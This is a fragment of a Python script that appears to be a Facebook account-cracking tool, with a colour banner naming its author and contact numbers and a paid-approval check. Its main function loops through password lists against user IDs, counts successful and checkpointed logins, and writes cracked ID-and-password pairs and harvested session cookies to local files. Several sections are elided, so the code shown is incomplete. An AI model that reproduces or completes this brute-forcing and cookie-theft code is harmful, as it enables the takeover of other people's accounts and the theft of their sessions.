...
logo =                                          ("""   
                                    ...
                                    \033[1;36m╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░░╚═════╝░     
                  \033[1;36m════════════════════════════════════════════════
                  \033[1;35m =[AUTHOR]=  \033[1;36m  \033[1;36m     MD RAJU
                  \033[1;36m =[FACEBOOK]=  \033[1;36m  \033[1;36m ABDULLAH RAJU 
                  \033[1;34m =[WHATSAPP]=  \033[1;36m  \033[1;36m 01792796865
                  \033[1;36m =[GITHUB]=  \033[1;36m   \033[1;36.          mrajuhasan0
                  \033[1;32m =[TOOLS ]=     \033[1;36m\033[1;36m.        RANDOM    \033[1;36m(V~0.1)
                  \033[1;36m════════════════════════════════════════════════
""")
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print('BKASH PERSONAL - +8801792796865')
...
def menu():
	...
	if ot == '1':
		os.system('xdg-open https://facebook/abdullahraju404')
		crack_file()
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r%s[RAJU] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
            sys.stdout.flush()
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92mRAJU-OK[🩷]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m🌺\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('RAJU-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('RAJU-coki.txt', 'a').write(coki+'\n')
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(RAJU-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
